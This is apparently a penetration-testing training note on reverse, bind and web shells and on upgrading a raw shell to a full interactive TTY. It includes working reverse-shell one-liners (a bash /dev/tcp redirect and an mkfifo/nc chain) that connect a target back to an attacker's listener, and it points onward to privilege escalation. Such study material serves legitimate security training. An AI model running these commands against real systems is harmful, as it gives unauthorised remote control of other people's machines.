# Shell Types, Listeners, and the TTY Upgrade

**Phase:** 04-foothold-and-shells
**Platform:** Linux / Windows
**Source module(s):** 02 Getting Started

## When to use

Immediately after gaining any form of remote code execution, to establish a usable interactive shell instead of working blind through a one-shot web shell or a raw, unstable pipe.

## Prerequisites

Code execution on the target (via a web shell, an exploit, or similar) and a listener ready on the attack host.

## Command

```bash
# attack host: start a listener
nc -lvnp <port>

# trigger on the target (Linux)
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

# alternative if bash /dev/tcp is unavailable
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# once connected, upgrade to a full TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
# Enter twice
export TERM=xterm-256color
stty rows <X> columns <Y>
```

| Part | What it does |
|---|---|
| `nc -lvnp <port>` | `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` port |
| `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` | Opens an interactive bash, redirects it over a TCP socket Linux exposes as a file via `/dev/tcp/` |
| `mkfifo` chain | Alternative that does not rely on `/dev/tcp` support, uses a named pipe to wire stdin/stdout/stderr through `nc` |
| `pty.spawn` | Spawns a real pseudo-terminal instead of the raw pipe a reverse shell starts as |
| `stty raw -echo` / `fg` / `export TERM=...` / `stty rows/columns` | Fixes terminal size, signal handling (Ctrl+C), and line editing so the shell behaves like a normal local terminal |

## Expected output

A fully interactive shell: tab completion, Ctrl+C sends SIGINT to the remote process instead of killing the listener, text editors like vim work correctly.

## What failure looks like

- `python: command not found`: try `python3`. Many modern systems do not alias `python` to Python 2 by default.
- A shell that "freezes" after `Ctrl+Z`: expected, that is the local `nc` being backgrounded so `stty raw -echo` can be applied to the local terminal before `fg` resumes it.

## Why it works

A raw reverse/bind shell is just a pipe: it has no concept of terminal size, signal forwarding, or line editing, which is why Ctrl+C kills the connection and tab completion does nothing. Spawning a pseudo-terminal (`pty.spawn`) on the remote side gives it a real terminal device; backgrounding the local `nc` and applying `stty raw -echo` to the **local** terminal (not the remote one) stops the local shell from eating control characters meant for the remote session; `fg` resumes it; `export TERM` and `stty rows/columns` tell both ends what kind of terminal they are dealing with so cursor movement and screen redraws work.

## Alternatives and tradeoffs

- Reverse vs bind vs web shell:

| Type | Behavior |
|---|---|
| Reverse | Target connects back to me |
| Bind | I connect to the target's listening port |
| Web | Commands sent via HTTP params (PHP/JSP/ASP) |

- Reverse shells need the target to be able to reach out (works through many outbound-permissive firewalls); bind shells need the attacker to reach a port on the target (works when only inbound is open); web shells need no network callback at all but are one-shot per command and awkward for anything interactive.
- `bash -c '.../dev/tcp/...'` is the default, memorized one-liner. The `mkfifo` chain is the fallback when `/dev/tcp` is not compiled into the target's shell.

## Next step

Once upgraded, move to local enumeration for privilege escalation: [05-privesc-linux](../05-privesc-linux/README.md) or [06-privesc-windows](../06-privesc-windows/README.md).

## Self-test

- [ ] I can explain it without notes
- [ ] I can predict the output before running it
- [ ] I can recognize a wrong result
- [ ] I can troubleshoot a failure
- [ ] I can reproduce it from the documentation if I forget the syntax
